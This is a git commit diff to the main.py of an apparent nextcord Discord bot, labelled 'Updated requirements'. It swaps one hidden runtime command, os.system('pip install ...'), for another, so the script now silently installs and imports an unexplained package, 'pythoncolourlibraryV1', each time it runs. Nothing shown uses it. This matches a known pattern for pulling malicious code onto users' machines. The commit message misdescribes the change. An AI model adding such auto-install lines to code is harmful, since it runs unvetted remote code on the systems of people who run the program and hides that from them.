ef803c329bedc389d4928eda081f7e267abeeb73
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-04-27 10:24:06 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pyfontslibraryV1")
-import pyfontslibraryV1
+os.system("pip install pythoncolourlibraryV1")
+import pythoncolourlibraryV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
